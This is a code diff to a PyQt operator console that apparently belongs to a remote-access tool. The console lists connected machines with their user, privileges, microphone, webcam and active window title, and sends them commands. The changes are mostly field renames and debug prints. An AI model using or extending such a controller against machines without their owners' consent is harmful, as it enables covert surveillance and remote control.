@@ -186,7 +186,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             'moderator': '',
             'ip_address': '',
             'alias': '',
-            'socket': '',
+            'key': '',
             'os': '',
             'user': '',
             'privs': '',
@@ -198,7 +198,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
         self.offline_filters = {
             'moderator': '',
-            'id': '',
+            'key': '',
             'alias': '',
             'ip_address': '',
         }
@@ -389,7 +389,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             'moderator': str(self.filter_moderator_line.text()),
             'ip_address': str(self.filter_ipaddress_line.text()),
             'alias': str(self.filter_alias_line.text()),
-            'socket': str(self.filter_socket_line.text()),
+            'key': str(self.filter_socket_line.text()),
             'os': str(self.filter_os_line.text()),
             'user': str(self.filter_user_line.text()),
             'privs': str(self.filter_privs_combo.itemData(self.filter_privs_combo.currentIndex()).toPyObject()),
@@ -402,7 +402,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
     def filter_offline_clinets(self):
         self.offline_filters = {
             'moderator': str(self.filter_moderator_line_offline.text()),
-            'id': str(self.filter_id_line_offline.text()),
+            'key': str(self.filter_id_line_offline.text()),
             'alias': str(self.filter_alias_line_offline.text()),
             'ip_address': str(self.filter_ipaddress_line_offline.text()),
         }
@@ -492,7 +492,9 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                             self.privs = int(data['payload'].split()[-1])
                             if self.privs == 1:
                                 self.enable_administrator()
+                                print 'admin enabled'
                             elif self.privs == 0:
+                                print 'admin disabled'
                                 self.disable_administrator()
 
                             self.acceptthreadState = True
@@ -554,14 +556,15 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         self.loginStatusLabel.setText(_('BOTTOM_LOGIN_STATUS'))
 
     def check_servers(self, session_id):
+        # Init Checker Socket
         self.checker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.checker_socket.connect((self.IPADDRESS, self.PORT))
         if data_receive(self.checker_socket):
-            print 'aq'
             while self.acceptthreadState:
                 try:
                     data = data_get(self.checker_socket, 'getClients', 'getClients', session_id)
-                    self.streaming_socks = data
+                    print data
+                    self.streaming_socks = data['payload']
                     print self.streaming_socks
                     self.emit(SIGNAL('updateTable()'))
                     time.sleep(3)
@@ -596,7 +599,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         if client:
             args = {
                 'sock': self.connection_socket,
-                'socket': self.streaming_socks[client]['socket'],
+                'key': self.streaming_socks[client]['key'],
                 'ipAddress': self.streaming_socks[client]['ip_address'],
                 'assets': assets,
             }
@@ -608,7 +611,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         if client:
             args = {
                 'sock': self.connection_socket,
-                'socket': self.streaming_socks[client]['socket'],
+                'key': self.streaming_socks[client]['key'],
                 'ipAddress': self.streaming_socks[client]['ip_address'],
                 'assets': assets,
             }
@@ -619,7 +622,6 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
     def update_servers_table(self):
 
         online_clients = {}
-        print online_clients
         offline_clients = {}
 
         # Split Clients
@@ -628,23 +630,21 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 if self.filters['moderator'] in self.streaming_socks[key]['moderator'] and \
                                 self.filters['ip_address'] in self.streaming_socks[key]['ip_address'] and \
                                 self.filters['alias'] in self.streaming_socks[key]['alias'] and \
-                                self.filters['socket'] in str(self.streaming_socks[key]['socket']) and \
+                                self.filters['key'] in str(self.streaming_socks[key]['key']) and \
                                 self.filters['os'] in self.streaming_socks[key]['os'] and \
                                 self.filters['user'] in self.streaming_socks[key]['user'] and \
                                 self.filters['privs'] in self.streaming_socks[key]['privileges'] and \
                                 self.filters['lock'] in self.streaming_socks[key]['protection'] and \
-                                self.filters['audio'] in self.streaming_socks[key]['inputdevice'] and \
-                                self.filters['camera'] in self.streaming_socks[key]['webcamdevice'] and \
-                                self.filters['title'] in self.streaming_socks[key]['activewindowtitle']:
+                                self.filters['audio'] in self.streaming_socks[key]['audio_device'] and \
+                                self.filters['camera'] in self.streaming_socks[key]['webcamera_device'] and \
+                                self.filters['title'] in self.streaming_socks[key]['window_title']:
                     online_clients[index] = self.streaming_socks[key]
             else:
                 if self.offline_filters['moderator'] in self.streaming_socks[key]['moderator'] and \
-                                self.offline_filters['id'] in self.streaming_socks[key]['id'] and \
+                                self.offline_filters['key'] in self.streaming_socks[key]['key'] and \
                                 self.offline_filters['alias'] in self.streaming_socks[key]['alias'] and \
                                 self.offline_filters['ip_address'] in self.streaming_socks[key]['ip_address']:
                     offline_clients[index] = self.streaming_socks[key]
-
-        print online_clients
 
 
         # Arange Clients Table
@@ -671,7 +671,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 self.clientsTable.setItem(index + 1, self.index_of_alias, item)
 
                 # add socket number
-                socket_value = str(online_clients[obj]['socket'])
+                socket_value = str(online_clients[obj]['key'])
                 item = QTableWidgetItem(socket_value)
                 if socket_value == 'OFFLINE':
                     item.setFlags(Qt.ItemIsSelectable | Qt.ItemIsEnabled)
@@ -716,7 +716,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
                 # add input device
                 item = QTableWidgetItem()
-                if online_clients[obj]['inputdevice'] == 'NoDevice':
+                if online_clients[obj]['audio_device'] == 'NoDevice':
                     item.setIcon(QIcon(os.path.join(assets, 'mic_no.png')))
                     item.setText(_('INFO_NO'))
                 else:
@@ -726,7 +726,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
 
                 # add webcam device
                 item = QTableWidgetItem()
-                if online_clients[obj]['webcamdevice'] == 'NoDevice':
+                if online_clients[obj]['webcamera_device'] == 'NoDevice':
                     item.setIcon(QIcon(os.path.join(assets, 'web_camera_no.png')))
                     item.setText(_('INFO_NO'))
                 else:
@@ -735,7 +735,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 self.clientsTable.setItem(index + 1, self.index_of_webcamera, item)
 
                 # add active windows title
-                item = QTableWidgetItem(online_clients[obj]['activewindowtitle'])
+                item = QTableWidgetItem(online_clients[obj]['window_title'])
                 item.setTextAlignment(Qt.AlignRight | Qt.AlignVCenter)
                 item.setTextColor(QColor('#1abc9c'))
                 self.clientsTable.setItem(index + 1, self.index_of_activeWindowTitle, item)
@@ -751,7 +751,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
                 item.setTextColor(QColor('#f1c40f'))
                 self.offlineClientsTable.setItem(index + 1, 0, item)
 
-                item = QTableWidgetItem(offline_clients[obj]['id'])
+                item = QTableWidgetItem(offline_clients[obj]['key'])
                 item.setTextAlignment(Qt.AlignLeft | Qt.AlignVCenter)
                 self.offlineClientsTable.setItem(index + 1, 1, item)
 
@@ -960,12 +960,12 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
             'processes': mprocesses,
         }
 
-        server = self.current_client()
-        if server:
+        client = self.current_client()
+        if client:
             args = {
                 'sock': self.current_sock,
-                'socket': self.socks[server]['socket'],
-                'ipAddress': self.socks[server]['ip_address'],
+                'key': self.socks[client]['key'],
+                'ipAddress': self.socks[client]['ip_address'],
                 'assets': assets,
             }
             plugin_id = id_generator()
@@ -978,7 +978,7 @@ class MainDialog(QMainWindow, gui.Ui_MainWindow):
         if client:
             text, ok = QInputDialog.getText(self, _('ALIAS_SET'), _('ALIAS_NAME'))
             if ok:
-                get(self.connection_socket, 'setAlias ' + str(text), self.streaming_socks[client]['id'])
+                get(self.connection_socket, 'setAlias ' + str(text), self.streaming_socks[client]['key'])
 
     def run_as_admin(self):
         client = self.current_client()
